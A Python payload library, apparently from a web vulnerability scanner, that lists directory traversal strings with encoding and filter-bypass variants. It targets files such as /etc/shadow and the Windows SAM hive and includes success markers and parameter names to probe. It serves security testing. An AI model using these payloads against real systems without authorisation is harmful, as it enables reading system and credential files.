"""
ReconScan Directory Traversal Payload Library

Comprehensive directory traversal testing payloads from exploit databases.
Organized by operating system and bypass technique.
"""

class DirectoryTraversalPayloads:
    """Comprehensive directory traversal payload collection for vulnerability testing."""
    
    def __init__(self):
        """Initialize directory traversal payload sets."""
        
        # Basic traversal payloads
        self.basic_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "../../etc/passwd",
            "..\\..\\windows\\win.ini"
        ]
        
        # Deep traversal payloads
        self.deep_traversal_payloads = [
            "../" * 10 + "etc/passwd",
            "..\\" * 10 + "windows\\win.ini",
            "../" * 15 + "etc/passwd",
            "..\\" * 15 + "windows\\win.ini",
            "../" * 20 + "etc/passwd",
            "..\\" * 20 + "windows\\win.ini"
        ]
        
        # URL encoded payloads
        self.encoded_payloads = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin%2eini",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini"
        ]
        
        # Double encoding payloads
        self.double_encoded_payloads = [
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini",
            "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
            "%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255cwindows%25255cwin%25252eini"
        ]
        
        # Unicode encoding payloads
        self.unicode_payloads = [
            "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002fetc\\u002fpasswd",
            "\\u002e\\u002e\\u005c\\u002e\\u002e\\u005c\\u002e\\u002e\\u005cwindows\\u005cwin\\u002eini",
            "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
            "..\\u005c..\\u005c..\\u005cwindows\\u005cwin.ini"
        ]
        
        # Filter bypass payloads
        self.bypass_payloads = [
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..;/..;/..;/etc/passwd",
            "..;\\..;\\..;\\windows\\win.ini",
            "/...//...//.../etc/passwd",
            "\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
            "....\\....\\....\\etc\\passwd",
            "....//....//....//windows//win.ini"
        ]
        
        # Null byte injection payloads
        self.null_byte_payloads = [
            "../../../etc/passwd%00",
            "..\\..\\..\\windows\\win.ini%00",
            "../../../etc/passwd%00.jpg",
            "..\\..\\..\\windows\\win.ini%00.txt",
            "../../../../etc/passwd%00.png",
            "..\\..\\..\\..\\windows\\win.ini%00.gif"
        ]
        
        # Path truncation payloads
        self.truncation_payloads = [
            "../../../etc/passwd" + "A" * 5000,
            "..\\..\\..\\windows\\win.ini" + "A" * 5000,
            "../../../etc/passwd" + "./" * 5000,
            "..\\..\\..\\windows\\win.ini" + ".\\" * 5000
        ]
        
        # Specific file targets
        self.target_files = {
            'linux': [
                "etc/passwd",
                "etc/shadow",
                "etc/hosts",
                "etc/hostname",
                "etc/issue",
                "etc/group",
                "etc/crontab",
                "etc/fstab",
                "proc/version",
                "proc/cmdline",
                "proc/meminfo",
                "proc/cpuinfo",
                "var/log/auth.log",
                "var/log/syslog"
            ],
            'windows': [
                "windows\\win.ini",
                "windows\\system.ini",
                "boot.ini",
                "windows\\system32\\drivers\\etc\\hosts",
                "windows\\system32\\config\\SAM",
                "windows\\system32\\config\\SYSTEM",
                "windows\\system32\\config\\SOFTWARE"
            ]
        }
        
        # Success indicators
        self.success_indicators = [
            'root:x:0:0:',        # Linux /etc/passwd
            '[fonts]',            # Windows win.ini
            'for 16-bit app support', # Windows win.ini
            '[boot loader]',      # Windows boot.ini
            'localhost',          # hosts file
            'daemon:x:',          # Linux /etc/passwd
            'Linux version',      # /proc/version
            'MemTotal:',          # /proc/meminfo
            '[Mail]',             # Windows win.ini
            '[extensions]'        # Windows win.ini
        ]
        
    def get_basic_payloads(self):
        """Get basic directory traversal payloads."""
        return self.basic_payloads
    
    def get_deep_traversal_payloads(self):
        """Get deep directory traversal payloads."""
        return self.deep_traversal_payloads
    
    def get_encoded_payloads(self):
        """Get URL encoded traversal payloads."""
        return self.encoded_payloads
    
    def get_double_encoded_payloads(self):
        """Get double URL encoded traversal payloads."""
        return self.double_encoded_payloads
    
    def get_unicode_payloads(self):
        """Get Unicode encoded traversal payloads."""
        return self.unicode_payloads
    
    def get_bypass_payloads(self):
        """Get filter bypass traversal payloads."""
        return self.bypass_payloads
    
    def get_null_byte_payloads(self):
        """Get null byte injection traversal payloads."""
        return self.null_byte_payloads
    
    def get_truncation_payloads(self):
        """Get path truncation traversal payloads."""
        return self.truncation_payloads
    
    def get_target_files(self, os_type='linux'):
        """Get target files for specific OS."""
        return self.target_files.get(os_type.lower(), self.target_files['linux'])
    
    def get_success_indicators(self):
        """Get indicators of successful directory traversal."""
        return self.success_indicators
    
    def generate_payloads_for_files(self, target_files, depth=4):
        """Generate traversal payloads for specific files."""
        payloads = []
        
        for file_path in target_files:
            # Basic traversal
            linux_payload = ("../" * depth) + file_path
            windows_payload = ("..\\" * depth) + file_path.replace('/', '\\')
            
            payloads.extend([linux_payload, windows_payload])
            
            # URL encoded versions
            encoded_linux = linux_payload.replace('../', '%2e%2e%2f')
            encoded_windows = windows_payload.replace('..\\', '%2e%2e%5c')
            
            payloads.extend([encoded_linux, encoded_windows])
        
        return payloads
    
    def get_all_payloads(self):
        """Get comprehensive list of all directory traversal payloads."""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.deep_traversal_payloads)
        all_payloads.extend(self.encoded_payloads)
        all_payloads.extend(self.double_encoded_payloads)
        all_payloads.extend(self.unicode_payloads)
        all_payloads.extend(self.bypass_payloads)
        all_payloads.extend(self.null_byte_payloads)
        # Note: Excluding truncation payloads from default list due to size
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium', os_type='linux'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            return self.basic_payloads[:5]
        elif severity == 'medium':
            payloads = []
            payloads.extend(self.basic_payloads)
            payloads.extend(self.encoded_payloads[:5])
            payloads.extend(self.bypass_payloads[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.basic_payloads
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for directory traversal testing."""
        return [
            'path', 'file', 'filename', 'dir', 'directory', 'folder',
            'page', 'include', 'inc', 'template', 'layout', 'skin',
            'doc', 'document', 'content', 'data', 'resource', 'src',
            'source', 'location', 'loc', 'url', 'uri', 'link', 'href',
            'target', 'dest', 'destination', 'upload', 'download'
        ] 